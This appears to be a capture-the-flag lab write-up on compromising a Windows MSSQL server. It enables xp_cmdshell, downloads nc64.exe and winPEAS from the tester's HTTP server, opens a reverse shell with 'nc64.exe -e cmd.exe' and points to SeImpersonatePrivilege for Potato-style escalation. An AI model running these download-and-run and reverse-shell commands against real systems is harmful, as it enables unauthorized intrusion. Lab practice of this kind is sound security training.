# PREREQUISITES (context)
## MSSQL Database
```bash
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.159.77:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```
 
**[Microsoft SQL Server (MSSQL)](https://en.wikipedia.org/wiki/Microsoft_SQL_Server)** (by default on port 1443)- proprietary **relational database management system (RDMS)** (system used to control relational databases, which stores data in excels) developed by Microsoft using SQL. Main function (typical for databases) - storing and retrieving data as requested by other software applications.

---

According to this [article](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) , we can enumerate it more deeply and list our current (and possible) privileges for future escalation. 

Let's check whether we are part of the system administrative group, using SQL Language:
```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
    
-   
1   
```
Output “1” means that we are already system administrator — we are tho most privileged user (system administrator).

### xp_cmdshell - command execution
According on [official documentation, provided by vendor (Microsoft)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17): `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using Policy-Based Management or by executing `sp_configure`. It spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text.

For this reason we can enable `xp_cmdshell `for executing system commands, going beyond the borders of database and manipulating the whole system. 
``` bash
enable_xp_cmdshell 
or
EXEC sp_configure 'show advanced options', 1;
```

Using options `powershell -c `we can execute powershell commands, but this is too complicated, so we can try to upload a reverse shell, using netcat and python simple http server for transmitting.
```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c pwd"

output                
-------------------   
NULL                  
Path                  
----                  
C:\Windows\system32    
```

Since we are in the system32 folder, we need to find directory, where we are able to upload and execute file. For this purpose we can utilize our user’s (sql_svc) “Downloads” directory.
```bash
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads"
```

We launch python http server for transmitting `nc64.exe` file between systems:
```python
Documents sudo python3 -m http.server 999
Serving HTTP on 0.0.0.0 port 999 (http://0.0.0.0:999/) ...
10.129.160.52 - - [16/May/2026 16:42:57] "GET /nc64.exe HTTP/1.1" 200 -
```

```powershell
 xp_cmdshell "powershell -cd C:\Users\sql_svc\Downloads; wget http://10.10.15.74:999/nc64.exe -outfile nc64.exe"
```
#### NC64.exe
`nc64.exe `is a windows-version of basic netcat programm. Basically, netcat is a utility used for variety tasks associated with TCP or UDP. With the help of netcat we can obtain reverse shell, but before it we need to launch netcat listener on our own machine.

``` bash
sudo nc -nlvp 443                            
Listening on 0.0.0.0 443
```

```bash
-n #numeric-only IP addresses
-l #listening mode for inbound connections
-v #vervose output
-p #local port
```

We launch netcat, with flag `-e` which after connection launches cmd.exe `(windows command line)` and redirects input and output to our the machine.
``` powershell
 SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.74 443"
```

Finally, we have successfully obtained reverse shell. 

# Privilege Escalation - WinPeas
In the same way, as a reverse shell we upload to the machine **[winPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/README.md)** - 
``` powershell
wget http://10.10.15.74:999/winPEASx64.exe -outfile winPEASx64.exe
```

`winPEASx64.exe `- software, which automatically analyzes the whole system and tries to find useful CVE's/Exploits/Vulnerabilities or Privilege Escalation Ways.

``` powershell
 Check if you can escalate privilege using some enabled token 
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT,  
    <SNIP>
C:\Users\sql_svc\AppData\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

```
We have found 2 interest attack vectors `SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED`, which makes machine vulnerable to the **[ juicy-potato exploit](https://github.com/ohpe/juicy-potato)** (or to the **[GodPotato](https://github.com/BeichenDream/GodPotato)**/**[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)** on newer systems).

---
# Attack Surface
### [[ConsoleHost_history.txt]]
### [[SeImpersonatePrivilege]]